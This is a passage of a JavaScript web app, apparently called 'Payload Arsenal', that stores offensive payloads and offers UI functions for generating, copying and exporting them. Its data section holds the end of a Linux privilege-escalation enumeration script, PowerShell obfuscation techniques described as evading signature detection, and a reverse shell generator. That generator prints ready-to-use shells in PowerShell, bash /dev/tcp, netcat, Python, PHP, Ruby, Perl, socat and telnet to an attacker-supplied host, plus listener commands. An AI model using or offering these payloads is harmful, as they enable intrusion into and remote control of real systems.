echo -e "\\n\\033[1;34m[+] Writable PATH Directories:\\033[0m"
IFS=':' read -ra ADDR <<< "$PATH"
for dir in "${ADDR[@]}"; do
    if [ -w "$dir" ]; then
        echo -e "\\033[1;31m[!] Writable PATH directory: $dir\\033[0m"
    fi
done

# Docker Check
echo -e "\\n\\033[1;34m[+] Container Escape Analysis:\\033[0m"
if [ -f /.dockerenv ]; then
    echo -e "\\033[1;31m[!] Running in Docker container\\033[0m"
    
    # Check for privileged container
    if [ -c /dev/kmsg ]; then
        echo -e "\\033[1;31m[!] Privileged container detected\\033[0m"
    fi
    
    # Check for docker socket
    if [ -S /var/run/docker.sock ]; then
        echo -e "\\033[1;31m[!] Docker socket accessible - potential escape vector\\033[0m"
    fi
    
    # Check capabilities
    if command -v capsh >/dev/null 2>&1; then
        echo "Current capabilities:"
        capsh --print
    fi
else
    echo "Not running in a container"
fi

# NFS Exports
echo -e "\\n\\033[1;34m[+] NFS Exports:\\033[0m"
cat /etc/exports 2>/dev/null || echo "No NFS exports"

# Network File Systems
echo -e "\\n\\033[1;34m[+] Network File Systems:\\033[0m"
mount | grep -E "(nfs|cifs|smb)"

# Password Files
echo -e "\\n\\033[1;34m[+] Password Files Access:\\033[0m"
ls -la /etc/passwd /etc/shadow /etc/group 2>/dev/null

# Loaded Kernel Modules
echo -e "\\n\\033[1;34m[+] Loaded Kernel Modules:\\033[0m"
lsmod | head -20

# Memory Protection
echo -e "\\n\\033[1;34m[+] Memory Protection:\\033[0m"
echo "ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)"
echo "ExecShield: $(cat /proc/sys/kernel/exec-shield 2>/dev/null)"

echo -e "\\n\\033[1;32m[*] Privilege Escalation Enumeration Complete\\033[0m"`,
                description: "Comprehensive Linux privilege escalation enumeration including SUID analysis, kernel exploits, and container escape vectors.",
                complexity: "advanced",
                platform: "linux",
                type: "bash",
                category: "Privilege Escalation",
                tags: ["privilege-escalation", "linux", "suid", "kernel-exploits", "container-escape"],
                mitre_id: "T1068"
            },

            powershell_obfuscation: {
                command: `# PowerShell Obfuscation Techniques
Write-Host "[*] PowerShell Obfuscation Examples" -ForegroundColor Cyan

# Base64 Encoding
Write-Host "\`n[+] Base64 Encoding:" -ForegroundColor Yellow
$command = "Write-Host 'Hello World'; Get-Process"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
Write-Host "Original: $command" -ForegroundColor Green
Write-Host "Encoded: $encoded" -ForegroundColor Cyan
Write-Host "Execute with: powershell -EncodedCommand $encoded" -ForegroundColor Magenta

# String Concatenation and Variables
Write-Host "\`n[+] String Concatenation:" -ForegroundColor Yellow
$w = "Write"
$h = "Host"
$cmd = $w + "-" + $h
Write-Host "Obfuscated command: `$cmd 'Hello World'" -ForegroundColor Cyan
& $cmd "Deobfuscated output"

# Character Replacement
Write-Host "\`n[+] Character Replacement:" -ForegroundColor Yellow
$obfuscated = "Wr1te-H0st".Replace("1","i").Replace("0","o")
Write-Host "Original: Wr1te-H0st" -ForegroundColor Green
Write-Host "Deobfuscated: $obfuscated" -ForegroundColor Cyan

# Environment Variables
Write-Host "\`n[+] Environment Variable Hiding:" -ForegroundColor Yellow
$env:mycmd = "Get-Process"
Write-Host "Hidden command in environment: `$env:mycmd" -ForegroundColor Cyan
Write-Host "Execute with: Invoke-Expression `$env:mycmd" -ForegroundColor Magenta

# Splatting
Write-Host "\`n[+] Splatting Technique:" -ForegroundColor Yellow
$params = @{
    Object = "Splatted command executed"
    ForegroundColor = "Green"
}
Write-Host "Splatting parameters: Write-Host @params" -ForegroundColor Cyan
Write-Host @params

# Character Codes (ASCII)
Write-Host "\`n[+] ASCII Character Codes:" -ForegroundColor Yellow
$chars = [char]87 + [char]114 + [char]105 + [char]116 + [char]101 + [char]45 + [char]72 + [char]111 + [char]115 + [char]116
Write-Host "ASCII decoded: $chars" -ForegroundColor Cyan

# Format String Obfuscation
Write-Host "\`n[+] Format String Obfuscation:" -ForegroundColor Yellow
$format = "{0}-{1}" -f "Write", "Host"
Write-Host "Format string result: $format" -ForegroundColor Cyan

# Invoke-Expression with Variables
Write-Host "\`n[+] Invoke-Expression Obfuscation:" -ForegroundColor Yellow
$iex = "Invoke-Expression"
$cmd = "Get-Date"
Write-Host "Obfuscated IEX: & `$iex `$cmd" -ForegroundColor Cyan
& $iex $cmd

# PowerShell Variable Obfuscation
Write-Host "\`n[+] Variable Name Obfuscation:" -ForegroundColor Yellow
Set-Variable -Name "a$(Get-Random)" -Value "Get-Service"
Get-Variable | Where-Object { $_.Value -eq "Get-Service" } | ForEach-Object {
    Write-Host "Random variable name: $($_.Name)" -ForegroundColor Cyan
}

# Type Acceleration Obfuscation
Write-Host "\`n[+] Type Acceleration:" -ForegroundColor Yellow
$type = [System.Management.Automation.PSObject]
Write-Host "Type loaded: $type" -ForegroundColor Cyan

# Script Block Obfuscation
Write-Host "\`n[+] Script Block Obfuscation:" -ForegroundColor Yellow
$sb = [ScriptBlock]::Create("Get-Process | Select-Object -First 3")
Write-Host "Script block created and executed:" -ForegroundColor Cyan
& $sb

# Advanced Concatenation
Write-Host "\`n[+] Advanced String Building:" -ForegroundColor Yellow
$builder = New-Object System.Text.StringBuilder
[void]$builder.Append("Get")
[void]$builder.Append("-")
[void]$builder.Append("Date")
$finalCmd = $builder.ToString()
Write-Host "StringBuilder result: $finalCmd" -ForegroundColor Cyan
Invoke-Expression $finalCmd

Write-Host "\`n[*] Obfuscation Examples Complete" -ForegroundColor Green
Write-Host "[INFO] These techniques help evade static analysis and signature detection" -ForegroundColor Yellow`,
                description: "Comprehensive PowerShell obfuscation techniques for evading detection and static analysis including encoding, variable manipulation, and advanced string operations.",
                complexity: "advanced",
                platform: "windows",
                type: "powershell",
                category: "Defense Evasion",
                tags: ["obfuscation", "encoding", "evasion", "powershell"],
                mitre_id: "T1027"
            },

            reverse_shell_generator: {
                command: `# Multi-Platform Reverse Shell Generator
Write-Host "[*] Reverse Shell Generator" -ForegroundColor Cyan

# Configuration
$lhost = Read-Host "Enter LHOST (attacker IP)"
$lport = Read-Host "Enter LPORT (attacker port)"

Write-Host "\`n[+] Generated Reverse Shells:" -ForegroundColor Yellow

# PowerShell Reverse Shell
Write-Host "\`n--- PowerShell Reverse Shell ---" -ForegroundColor Green
$psReverseShell = @"
`$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
`$stream = `$client.GetStream();
[byte[]]`$bytes = 0..65535|%{0};
while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0) {
    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);
    `$sendback = (iex `$data 2>&1 | Out-String );
    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
    `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
    `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
    `$stream.Flush()
};
`$client.Close()
"@
Write-Host $psReverseShell -ForegroundColor Cyan

# Base64 Encoded PowerShell
$encodedPS = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($psReverseShell))
Write-Host "\`n--- Base64 Encoded PowerShell ---" -ForegroundColor Green
Write-Host "powershell -EncodedCommand $encodedPS" -ForegroundColor Cyan

# Bash Reverse Shell
Write-Host "\`n--- Bash Reverse Shell ---" -ForegroundColor Green
$bashShell = "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
Write-Host $bashShell -ForegroundColor Cyan

# Netcat Reverse Shells
Write-Host "\`n--- Netcat Reverse Shells ---" -ForegroundColor Green
Write-Host "nc -e /bin/sh $lhost $lport" -ForegroundColor Cyan
Write-Host "nc -e /bin/bash $lhost $lport" -ForegroundColor Cyan
Write-Host "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" -ForegroundColor Cyan

# Python Reverse Shells
Write-Host "\`n--- Python Reverse Shells ---" -ForegroundColor Green
$pythonShell = @"
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('$lhost',$lport));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(['/bin/sh','-i']);
"@
Write-Host "python -c `"$pythonShell`"" -ForegroundColor Cyan

# Python3 One-liner
$python3Shell = "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
Write-Host "python3 -c `"$python3Shell`"" -ForegroundColor Cyan

# PHP Reverse Shell
Write-Host "\`n--- PHP Reverse Shell ---" -ForegroundColor Green
$phpShell = "php -r '`$sock=fsockopen(`"$lhost`",$lport);exec(`"/bin/sh -i <&3 >&3 2>&3`");'"
Write-Host $phpShell -ForegroundColor Cyan

# Ruby Reverse Shell
Write-Host "\`n--- Ruby Reverse Shell ---" -ForegroundColor Green
$rubyShell = "ruby -rsocket -e'f=TCPSocket.open(`"$lhost`",$lport).to_i;exec sprintf(`"/bin/sh -i <&%d >&%d 2>&%d`",f,f,f)'"
Write-Host $rubyShell -ForegroundColor Cyan

# Perl Reverse Shell
Write-Host "\`n--- Perl Reverse Shell ---" -ForegroundColor Green
$perlShell = "perl -e 'use Socket;`$i=`"$lhost`";`$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(`"tcp`"));if(connect(S,sockaddr_in(`$p,inet_aton(`$i)))){open(STDIN,`">&S`");open(STDOUT,`">&S`");open(STDERR,`">&S`");exec(`"/bin/sh -i`");};'"
Write-Host $perlShell -ForegroundColor Cyan

# Node.js Reverse Shell
Write-Host "\`n--- Node.js Reverse Shell ---" -ForegroundColor Green
$nodeShell = @"
require('child_process').exec('nc -e /bin/sh $lhost $lport')
"@
Write-Host "node -e `"$nodeShell`"" -ForegroundColor Cyan

# Socat Reverse Shell
Write-Host "\`n--- Socat Reverse Shell ---" -ForegroundColor Green
Write-Host "socat tcp-connect:$lhost`:$lport exec:/bin/sh,pty,stderr,setsid,sigint,sane" -ForegroundColor Cyan

# Telnet Reverse Shell
Write-Host "\`n--- Telnet Reverse Shell ---" -ForegroundColor Green
Write-Host "rm -f /tmp/p; mknod /tmp/p p && telnet $lhost $lport 0</tmp/p" -ForegroundColor Cyan

# Windows CMD Reverse Shell
Write-Host "\`n--- Windows CMD Reverse Shell ---" -ForegroundColor Green
Write-Host "powershell -nop -c `"`$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()`"" -ForegroundColor Cyan

# Listener Setup Instructions
Write-Host "\`n[+] Listener Setup:" -ForegroundColor Yellow
Write-Host "Start your listener with: nc -lvnp $lport" -ForegroundColor Magenta
Write-Host "Or with socat: socat file:\`tty,raw,echo=0 tcp-listen:$lport" -ForegroundColor Magenta

Write-Host "\`n[*] Reverse Shell Generation Complete" -ForegroundColor Green
Write-Host "[WARNING] Use only for authorized penetration testing!" -ForegroundColor Red`,
                description: "Comprehensive reverse shell generator for multiple platforms and languages including PowerShell, Bash, Python, PHP, and more.",
                complexity: "intermediate",
                platform: "windows",
                type: "powershell",
                category: "Command & Control",
                tags: ["reverse-shell", "c2", "multi-platform", "generator"],
                mitre_id: "T1059"
            }
        };
    }

    setupEventListeners() {
        try {
            // Navigation
            document.querySelectorAll('.nav-item').forEach(item => {
                item.addEventListener('click', (e) => {
                    const section = e.target.dataset.section;
                    if (section) {
                        this.loadSection(section);
                    }
                });
            });

            // Search
            const searchInput = document.getElementById('searchInput');
            if (searchInput) {
                searchInput.addEventListener('input', (e) => this.performSearch(e.target.value));
            }

            // Filter toggle
            const filterBtn = document.getElementById('filterBtn');
            if (filterBtn) {
                filterBtn.addEventListener('click', () => this.toggleFilters());
            }

            // Clear search
            const clearBtn = document.getElementById('clearBtn');
            if (clearBtn) {
                clearBtn.addEventListener('click', () => this.clearSearch());
            }

            // Theme toggle
            const themeToggle = document.getElementById('themeToggle');
            if (themeToggle) {
                themeToggle.addEventListener('click', () => this.toggleTheme());
            }

            // Settings
            const settingsBtn = document.getElementById('settingsBtn');
            if (settingsBtn) {
                settingsBtn.addEventListener('click', () => this.openSettings());
            }

            // Mobile menu toggle
            const menuToggle = document.getElementById('menuToggle');
            if (menuToggle) {
                menuToggle.addEventListener('click', () => this.toggleMobileMenu());
            }

            // Filter change handlers
            document.querySelectorAll('.filter-options input[type="checkbox"]').forEach(checkbox => {
                checkbox.addEventListener('change', () => this.applyFilters());
            });

            // Modal close handlers
            document.addEventListener('click', (e) => {
                if (e.target.classList.contains('modal')) {
                    this.closeModal();
                    this.closeSettings();
                }
            });

            console.log('Event listeners setup complete');
        } catch (error) {
            console.error('Failed to setup event listeners:', error);
        }
    }

    loadSection(sectionId) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
        const navItem = document.querySelector(`[data-section="${sectionId}"]`);
        if (navItem) navItem.classList.add('active');

        this.currentSection = sectionId;
        this.generateSectionContent(sectionId);
    }

    generateSectionContent(sectionId) {
        try {
            this.showLoadingIndicator('Loading section content...');
            const contentSections = document.querySelector('.content-sections');
            if (!contentSections) {
                console.error('Content sections container not found');
                this.hideLoadingIndicator();
                return;
            }

            contentSections.innerHTML = '';

            const section = document.createElement('div');
            section.className = 'content-section active';
            section.id = sectionId;

            const sectionHeader = this.createSectionHeader(sectionId);
            const payloadGrid = document.createElement('div');
            payloadGrid.className = 'payload-grid';

            section.appendChild(sectionHeader);
            section.appendChild(payloadGrid);
            contentSections.appendChild(section);

            setTimeout(() => {
                this.populateSection(sectionId, payloadGrid);
                this.hideLoadingIndicator();
                console.log(`Section ${sectionId} loaded successfully`);
            }, 100);
        } catch (error) {
            console.error('Failed to generate section content:', error);
            this.hideLoadingIndicator();
            this.showNotification('Failed to load section content', 'error');
        }
    }

    createSectionHeader(sectionId) {
        const header = document.createElement('div');
        header.className = 'section-header';
        header.innerHTML = `
            <h2><i class="${this.getSectionIcon(sectionId)}"></i> ${this.formatTitle(sectionId)}</h2>
            <div class="section-actions">
                <span class="section-count">0 techniques</span>
                <div class="section-controls">
                    <button class="btn-secondary" onclick="app.exportSection('${sectionId}')">
                        <i class="fas fa-download"></i> Export All
                    </button>
                </div>
            </div>
        `;
        return header;
    }

    populateSection(sectionId, container) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);

        if (sectionPayloads.length === 0) {
            const noPayloads = document.createElement('div');
            noPayloads.className = 'no-payloads';
            noPayloads.innerHTML = `
                <div class="no-payloads-content">
                    <i class="fas fa-info-circle"></i>
                    <h3>No techniques available</h3>
                    <p>This section is currently being developed. Check back soon for new content!</p>
                </div>
            `;
            container.appendChild(noPayloads);
        } else {
            sectionPayloads.forEach(([key, payload]) => {
                const card = this.createPayloadCard(key, payload);
                container.appendChild(card);
            });
        }

        const countElement = document.querySelector(`#${sectionId} .section-count`);
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;
        card.dataset.type = payload.type;
        card.dataset.key = key;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    <span class="platform-badge ${payload.platform}">
                        <i class="${this.getPlatformIcon(payload.platform)}"></i>
                        ${payload.platform}
                    </span>
                    <span class="type-badge">${payload.type}</span>
                </div>
            </div>
            <p class="card-description">${payload.description}</p>
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-metadata">
                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
                <span class="category-tag">${payload.category}</span>
            </div>
            <div class="card-actions">
                <button class="btn-primary" onclick="app.generatePayload('${key}')">
                    <i class="fas fa-rocket"></i> Generate
                </button>
                <button class="btn-secondary" onclick="app.copyToClipboard('${key}')">
                    <i class="fas fa-copy"></i> Copy
                </button>
                <button class="btn-icon ${isFavorite ? 'active' : ''}" onclick="app.toggleFavorite('${key}')">
                    <i class="fas fa-heart"></i>
                </button>
                <button class="btn-icon" onclick="app.showPayloadDetails('${key}')">
                    <i class="fas fa-info-circle"></i>
                </button>
            </div>
        `;

        return card;
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = {
            // System Information
            system_info: ['windows_sysinfo', 'linux_sysinfo', 'unix_sysinfo'],
            network_recon: ['windows_network_recon', 'linux_network_recon'],
            osint: ['windows_sysinfo', 'linux_sysinfo'],
            enumeration: ['windows_sysinfo', 'linux_sysinfo', 'unix_sysinfo'],
            
            // Credential Access
            credential_dump: ['windows_credential_dump', 'linux_credential_dump'],
            password_attacks: ['windows_credential_dump'],
            token_theft: ['windows_credential_dump'],
            kerberos: ['windows_credential_dump'],
            
            // Privilege Escalation
            windows_privesc: ['windows_privesc_enum'],
            linux_privesc: ['linux_privesc_enum'],
            unix_privesc: ['linux_privesc_enum'],
            kernel_exploits: ['linux_privesc_enum'],
            
            // Defense Evasion
            av_evasion: ['powershell_obfuscation'],
            edr_bypass: ['powershell_obfuscation'],
            obfuscation: ['powershell_obfuscation'],
            steganography: [],
            
            // Persistence
            windows_persistence: [],
            linux_persistence: [],
            bootkit: [],
            rootkit: [],
            
            // Lateral Movement
            smb_lateral: [],
            wmi_lateral: [],
            ssh_lateral: [],
            rdp_lateral: [],
            
            // Command & Control
            c2_channels: ['reverse_shell_generator'],
            covert_comms: ['reverse_shell_generator'],
            dns_tunneling: [],
            web_shells: [],
            
            // Exfiltration
            data_exfil: [],
            dns_exfil: [],
            encrypted_exfil: [],
            cloud_exfil: [],
            
            // Impact
            destruction: [],
            ransomware: [],
            denial_service: [],
            wiper: [],
            
            // Custom Tools
            payload_builder: [],
            encoder: ['powershell_obfuscation'],
            shellcode_gen: [],
            reverse_shell: ['reverse_shell_generator']
        };

        const payloadKeys = sectionMap[sectionId] || [];
        return payloadKeys.map(key => [key, this.payloads[key]]).filter(([key, payload]) => payload);
    }

    generatePayload(type) {
        const payload = this.payloads[type];
        if (!payload) {
            this.showNotification('Payload not found', 'error');
            return;
        }

        this.showLoadingIndicator('Generating payload...');
        
        setTimeout(() => {
            this.showOutput(type, payload);
            this.addToHistory(type, payload);
            this.hideLoadingIndicator();
            this.showNotification(`Generated "${this.formatTitle(type)}" successfully!`, 'success');
        }, 500);
    }

    showOutput(type, payload) {
        const outputPanel = document.getElementById('outputPanel');
        if (!outputPanel) return;

        outputPanel.classList.add('active');
        this.currentPayload = { type, payload };

        const payloadOutput = document.getElementById('payloadOutput');
        const codeLanguage = document.getElementById('codeLanguage');
        const codeSize = document.getElementById('codeSize');
        
        if (payloadOutput) {
            payloadOutput.textContent = payload.command;
        }
        
        if (codeLanguage) {
            codeLanguage.textContent = payload.type || 'Unknown';
        }
        
        if (codeSize) {
            codeSize.textContent = `${payload.command.length} bytes`;
        }

        this.updateMetadataTab(type, payload);
        this.updateHistoryTab();
    }

    updateMetadataTab(type, payload) {
        const metadataContent = document.getElementById('metadataContent');
        if (!metadataContent) return;

        metadataContent.innerHTML = `
            <div class="metadata-grid">
                <div class="metadata-item">
                    <strong>Technique:</strong> ${this.formatTitle(type)}
                </div>
                <div class="metadata-item">
                    <strong>Platform:</strong> <i class="${this.getPlatformIcon(payload.platform)}"></i> ${payload.platform}
                </div>
                <div class="metadata-item">
                    <strong>Type:</strong> ${payload.type}
                </div>
                <div class="metadata-item">
                    <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                </div>
                <div class="metadata-item">
                    <strong>Category:</strong> ${payload.category}
                </div>
                <div class="metadata-item">
                    <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                </div>
                <div class="metadata-item">
                    <strong>Tags:</strong> ${payload.tags ? payload.tags.join(', ') : 'None'}
                </div>
                <div class="metadata-item">
                    <strong>Generated:</strong> ${new Date().toLocaleString()}
                </div>
            </div>
        `;
    }

    updateHistoryTab() {
        const historyContent = document.getElementById('historyContent');
        if (!historyContent) return;

        if (this.payloadHistory.length === 0) {
            historyContent.innerHTML = '<p>No payload history available.</p>';
            return;
        }

        const historyHtml = this.payloadHistory.slice(0, 10).map(item => `
            <div class="history-item">
                <div class="history-header">
                    <strong>${this.formatTitle(item.type)}</strong>
                    <span class="history-time">${new Date(item.timestamp).toLocaleString()}</span>
                </div>
                <div class="history-description">${item.description}</div>
                <div class="history-actions">
                    <button class="btn-sm" onclick="app.regenerateFromHistory('${item.type}')">
                        <i class="fas fa-redo"></i> Regenerate
                    </button>
                </div>
            </div>
        `).join('');

        historyContent.innerHTML = historyHtml;
    }

    copyToClipboard(type) {
        const payload = type ? this.payloads[type] : this.currentPayload?.payload;
        if (!payload) {
            this.showNotification('No payload to copy', 'error');
            return;
        }

        const textToCopy = payload.command || payload;
        navigator.clipboard.writeText(textToCopy).then(() => {
            this.showNotification('Copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy to clipboard', 'error');
        });
    }

    downloadPayload() {
        if (!this.currentPayload) {
            this.showNotification('No payload to download', 'error');
            return;
        }

        const { type, payload } = this.currentPayload;
        const filename = `${type}_${new Date().toISOString().slice(0, 10)}.${this.getFileExtension(payload.type)}`;
        
        const blob = new Blob([payload.command], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        this.showNotification('Payload downloaded!', 'success');
    }

    getFileExtension(type) {
        const extensions = {
            'powershell': 'ps1',
            'bash': 'sh',
            'cmd': 'bat',
            'python': 'py',
            'c': 'c'
        };
        return extensions[type] || 'txt';
    }

    sharePayload() {
        if (!this.currentPayload) {
            this.showNotification('No payload to share', 'error');
            return;
        }

        if (navigator.share) {
            navigator.share({
                title: `Payload: ${this.formatTitle(this.currentPayload.type)}`,
                text: this.currentPayload.payload.command
            });
        } else {
            this.copyToClipboard();
            this.showNotification('Payload copied for sharing!', 'info');
        }
    }

    toggleFavorite(type) {
        const index = this.favorites.indexOf(type);
        if (index > -1) {
            this.favorites.splice(index, 1);
            this.showNotification('Removed from favorites', 'info');
        } else {
            this.favorites.push(type);
            this.showNotification('Added to favorites', 'success');
        }
        localStorage.setItem('favorites', JSON.stringify(this.favorites));
        this.generateSectionContent(this.currentSection);
    }

    showPayloadDetails(type) {
        const payload = this.payloads[type];
        if (!payload) return;

        const modal = document.getElementById('detailsModal');
        const title = document.getElementById('modalTitle');
        const body = document.getElementById('modalBody');

        if (title) title.textContent = this.formatTitle(type);
        if (body) {
            body.innerHTML = `
                <div class="payload-details">
                    <div class="detail-section">
                        <h4>Description</h4>
                        <p>${payload.description}</p>
                    </div>
                    <div class="detail-section">
                        <h4>Technical Details</h4>
                        <ul>
                            <li><strong>Platform:</strong> ${payload.platform}</li>
                            <li><strong>Type:</strong> ${payload.type}</li>
                            <li><strong>Complexity:</strong> ${payload.complexity}</li>
                            <li><strong>Category:</strong> ${payload.category}</li>
                            <li><strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}</li>
                        </ul>
                    </div>
                    <div class="detail-section">
                        <h4>Tags</h4>
                        <div class="tag-list">
                            ${payload.tags ? payload.tags.map(tag => `<span class="tag">${tag}</span>`).join('') : 'None'}
                        </div>
                    </div>
                    <div class="detail-actions">
                        <button class="btn-primary" onclick="app.generatePayload('${type}'); app.closeModal();">
                            <i class="fas fa-rocket"></i> Generate Payload
                        </button>
                        <button class="btn-secondary" onclick="app.copyToClipboard('${type}')">
                            <i class="fas fa-copy"></i> Copy Code
                        </button>
                    </div>
                </div>
            `;
        }

        if (modal) modal.classList.add('active');
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
    }

    clearSearch() {
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.value = '';
            this.searchTerm = '';
            this.filterPayloads();
        }
    }

    applyFilters() {
        // Update active filters based on checkboxes
        this.activeFilters.platform = Array.from(document.querySelectorAll('.platform-filters input:checked')).map(cb => cb.value);
        this.activeFilters.complexity = Array.from(document.querySelectorAll('.complexity-filters input:checked')).map(cb => cb.value);
        this.activeFilters.type = Array.from(document.querySelectorAll('.type-filters input:checked')).map(cb => cb.value);
        
        this.filterPayloads();
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;

        cards.forEach(card => {
            const title = card.querySelector('h3')?.textContent.toLowerCase() || '';
            const description = card.querySelector('.card-description')?.textContent.toLowerCase() || '';
            const tags = Array.from(card.querySelectorAll('.tag')).map(tag => tag.textContent.toLowerCase());

            const matchesSearch = !this.searchTerm || 
                title.includes(this.searchTerm) || 
                description.includes(this.searchTerm) ||
                tags.some(tag => tag.includes(this.searchTerm));

            const matchesPlatform = this.activeFilters.platform.includes(card.dataset.platform);
            const matchesComplexity = this.activeFilters.complexity.includes(card.dataset.complexity);
            const matchesType = this.activeFilters.type.includes(card.dataset.type);

            if (matchesSearch && matchesPlatform && matchesComplexity && matchesType) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    toggleFilters() {
        const panel = document.getElementById('filterPanel');
        if (panel) {
            panel.classList.toggle('active');
        }
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();
        localStorage.setItem('theme', this.currentTheme);

        const icon = document.querySelector('#themeToggle i');
        if (icon) {
            icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        }
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            description: payload.description,
            timestamp: new Date().toISOString()
        };

        this.payloadHistory.unshift(historyItem);
        if (this.payloadHistory.length > 50) {
            this.payloadHistory = this.payloadHistory.slice(0, 50);
        }

        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    regenerateFromHistory(type) {
        this.generatePayload(type);
    }

    exportSection(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);
        if (sectionPayloads.length === 0) {
            this.showNotification('No payloads to export in this section', 'warning');
            return;
        }

        let exportData = `# ${this.formatTitle(sectionId)} - Exported from Payload Arsenal\n`;
        exportData += `# Generated on ${new Date().toLocaleString()}\n\n`;

        sectionPayloads.forEach(([key, payload]) => {
            exportData += `## ${this.formatTitle(key)}\n`;
            exportData += `Platform: ${payload.platform}\n`;
            exportData += `Type: ${payload.type}\n`;
            exportData += `Complexity: ${payload.complexity}\n`;
            exportData += `Description: ${payload.description}\n\n`;
            exportData += `\`\`\`${payload.type}\n${payload.command}\n\`\`\`\n\n`;
        });

        const blob = new Blob([exportData], { type: 'text/markdown' });
        const url = URL.createObjectURL(blob);
        
        const a = document.createElement('a');
        a.href = url;
        a.download = `${sectionId}_payloads_${new Date().toISOString().slice(0, 10)}.md`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.showNotification(`Exported ${sectionPayloads.length} payloads!`, 'success');
    }

    updateStats() {
        const totalPayloads = document.getElementById('totalPayloads');
        if (totalPayloads) {
            totalPayloads.textContent = `${Object.keys(this.payloads).length}+`;
        }
    }

    openSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.add('active');
        }
    }

    closeSettings() {
        const modal = document.getElementById('settingsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    closeOutput() {
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) outputPanel.classList.remove('active');
    }

    closeModal() {
        const modal = document.getElementById('detailsModal');
        if (modal) {
            modal.classList.remove('active');
        }
    }

    toggleMobileMenu() {
        const sidebar = document.getElementById('sidebar');
        if (sidebar) {
            sidebar.classList.toggle('active');
        }
    }

    initializeTabSwitching() {
        const outputTabs = document.querySelectorAll('.output-tab');
        const tabContents = document.querySelectorAll('.tab-content');

        outputTabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const targetTab = tab.dataset.tab;
                
                outputTabs.forEach(t => t.classList.remove('active'));
                tabContents.forEach(content => content.classList.remove('active'));
                
                tab.classList.add('active');
                
                const targetContent = document.getElementById(targetTab + 'Tab');
                if (targetContent) {
                    targetContent.classList.add('active');
                }
            });
        });
    }

    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        if (!container) return;

        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${this.getNotificationIcon(type)}"></i>
                <span>${message}</span>
            </div>
        `;

        container.appendChild(notification);
        setTimeout(() => notification.classList.add('show'), 100);
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (container.contains(notification)) {
                    container.removeChild(notification);
